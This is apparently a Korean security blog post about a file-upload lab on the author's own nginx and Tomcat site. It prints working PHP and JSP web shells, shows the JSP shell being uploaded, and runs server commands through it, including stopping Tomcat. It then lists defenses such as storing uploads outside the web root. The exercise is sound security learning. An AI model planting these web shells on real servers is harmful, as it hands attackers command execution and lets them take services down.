---
title: "File Upload 취약점 실습"
excerpt: "File Upload 에 대하여 알아보고 직접 웹 쉘을 업로드 해보자."
tags:
    - File Upload
    - jsp
    - servlet
last_modified_at: 2023-05-31T09:13:00-05:00
---
## File Upload 취약점이란?
- 파일 업로드 기능의 취약점을 이용하여 악의적인 파일(웹쉘)을 업로드한다. 이러한 업로드를 통해 서버의 시스템 권환을 장악할 수 있다.
- 공격자가 악성 파일을 업로드하고 공격자가 url 링크를 통해 공격자가 올린 파일에 접속이 가능할 때 발생하는 공격법이다.
- 웹 쉘 파일을 서버로 업로드하여 공격자는 시스템 내부의 명령을 수행할 수 있다.


## 취약점 발생 위치
- 파일 업로드가 가능한 곳
- 게시글<br>![Pasted image 20230531170442](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4b77c359-86b1-455e-a7c2-015d229ab7bb)

## 웹 쉘
- 웹 서비스를 구동하기 위한 웹서버 환경에서 지원 가능한 웹 애플리케이션 언어를 기반으로 동작되는 파일을 의미한다.
- 외부망에 있는 공격자가 시스템 내부 명령을 수행을 하기 위한 목적으로 사용된다.

### PHP 스크립트 일 때

```php
<?php echo system($_GET['cmd']); ?>
```

### JSP 스크립트 일 때

```jsp
<%@ page import="java.io.*" %>
<%
try {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    InputStream in = p.getInputStream();
    int c;
    while((c=in.read())!=-1){
        out.print((char)c);
    }
    in.close();
    try {
        p.waitFor();
    }catch(Exception e){
        out.println(e.getMessage());
    }
}catch(Exception e){
    out.println(e.getMessage());
}
%>
```

## 업로드 취약점 실습
- 직접 만든 웹 페이지의 업로드 부분의 취약점을 이용하여 실습하였다.

### 실습 서버 환경
- nginx + tomcat ( WAS )

### 파일 업로드 위치 확인
- 게시글<br>![Pasted image 20230531170549](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/20be9578-36d5-4089-b306-a7b0837fecda)<br>![Pasted image 20230531170615](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/923dc625-df69-48c5-86fb-0ae5c29661ec)

### 웹 쉘 업로드 하기.
1. 웹 쉘 JSP 스크립트 작성하기.<br>![Pasted image 20230531190315](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8c98cc8e-f4ee-4620-ab09-6eb6f8d91cb9)
2. 파일 업로드를 위한 게시글 작성하기 및 저장하기.<br>![Pasted image 20230531175551](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/47f35ad0-7052-4aa5-b627-51f19181ab83)<br>![Pasted image 20230531175622](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/fcffc78a-c412-4b2b-b878-0089e3e2fec8)

3. 게시글에서 파일이 잘 다운되는 것을 확인할 수 있다. 다운로드 요청 링크를 보면 get 요청의 파라미터로 파일이름과 폴더이름이 들어있는 것을 확인할 수 있다.<br>![Pasted image 20230531175720](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/378b3221-c1e5-416f-ae9e-96be006e51e8)
4. URL을 통해 업로드한 test.jsp에 접속해 보자.<br>![Pasted image 20230531190443](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/49deb562-3906-41a7-8b8f-7fdde07f1cfd)<br>`http://221.27.0.6/1685527431308_110/test.jsp`
5. 아무런 파라미터를 안주면 null 오류가 발생한다.<br>![Pasted image 20230531190604](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/31367fa8-0ac0-4960-aff7-24d322e95e75)

### 명령어 입력하기
1. `http://사이트 주소/test.jsp?cmd=pwd` 를 통해 파일 목록을 나열할 수 있다.<br>![Pasted image 20230531201540](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c905b0f8-649d-4e2b-9b10-1a951a686513)
2. 서버 버전확인하기.<br>`http://사이트 주소/test.jsp?cmd=cat%20/etc/issue`<br>![Pasted image 20230531193854](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/ed2a602a-008e-4a09-b54c-5cbcfce1b6d4)
3. 명령을 통해 웹 서버를 종료시켜 보자. 먼저 apache 서버인지 nginx 서버인지 확인하기.<br>`http://사이트 주소?cmd=service%20nginx%20status`<br>![Pasted image 20230531203111](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0cbadaee-ff57-4261-b49f-9fdf1c7518e3)
4. nginx 서버인 것을 확인하였다. `service nginx stop` 명령을 통해 nginx 서버를 종료시켜 보자. nginx 서버를 멈추기 위해서는 관리자 권한이 필요하다. 따라서 nginx 서버를 종료하는 것은 어려워 보인다.
5. 톰캣 서버를 종료시켜보자. 먼저 `apache-tomcat-10.1.9/bin` 폴더에 `shutdown` 파일이 있다. 이 파일을 실행 시키면 톰캣 서버는 종료된다.<br>![Pasted image 20230531203806](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0ee94f88-316b-43c4-997d-175efca63c51)<br>`http://사이트 주소?cmd=./shutdown.sh`
6. 톰캣 서버가 종료되었다는 것을 확인할 수 있다.<br>![Pasted image 20230531203923](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d8f5b5ba-a42f-4acc-bc2d-92b2714c7557)


## File Upload 취약점 대응방안
- 파일 업로드 저장위치를 물리적으로 분리시켜주면 된다. 즉 웹 페이지가 저장되어 있는 서버와 파일이 저장되는 서버를 분리시켜주면 된다.
- 파일 저장 위치를 웹 링크를 통해 접속할 수 없는 위치로 설정하여야 한다.
- 웹 서버의 계정의 접근 권한을 제한하는 방법도 있다.

## 웹 페이지 파일 업로드 취약점 없애기
- 파일 저장 위치를 웹 URL을 통해 접속할 수 없는 장소로 설정해 주었다. 이제 웹 URL로 접속할 수 없다.

```java
private String getFilePath(ServletRequest request,String folderName){
	// 업로드 폴더 존재 확인 업로드 폴더 존재안하면 만들어주기.
	// 링크를 통해 접근할 수 없는 위치에 만들어주기.
	var path = new File(request.getServletContext().getRealPath("")).getParentFile().getParent()+File.separatorChar+"upload_folder";
	var folder = new File(path);
	if(!folder.exists() || !folder.isDirectory()){
		folder.mkdir(); // 업로드 폴더 만들기.
	}
	path = path + File.separsatorChar + folderName;
	return path;
}
```


- 웹 페이지에서 폴더 이름을 예측할 수 있는 가능성을 없애주었고, 게시글 번호 파라미터를 추가해주었다.<br>![Pasted image 20230531190443](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f378cdf7-9dea-4946-b584-1c4e3755fa9d)<br>![Pasted image 20230531212208](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8b522229-9ed6-4601-95be-cd3675ba6a74)

## 후기
- 직접 웹 쉘을 작성하고 웹 서버에 업로드하여 외부에서 서버 명령어를 실행시켜 보았다. 처음에는 웹 쉘이 무엇인지 몰랐고 찾아보아도 이해가 잘안되었는데 직접 실습을 해보니 웹 쉘이 어떤것인지 감이 잡혔다. 서버에 접속하여 원하는 명령을 마음데로 실행 시켜보니 파일 업로드 취약점이 서버에 얼마나 위험한지 알 수 있었다.

## 참고 사이트
- [윈도우 cmd 명령어 실행 : Java로 실행파일 실행시키기 응용 (tistory.com)](https://haenny.tistory.com/266)
- [내가 만든 홈페이지 해킹하기(4) (velog.io)](https://velog.io/@jsw4215/%EB%82%B4%EA%B0%80-%EB%A7%8C%EB%93%A0-%ED%99%88%ED%8E%98%EC%9D%B4%EC%A7%80-%ED%95%B4%ED%82%B9%ED%95%98%EA%B8%B04)
- [File Upload 공격 : 네이버 블로그 (naver.com)](https://m.blog.naver.com/nahejae533/220997626311)
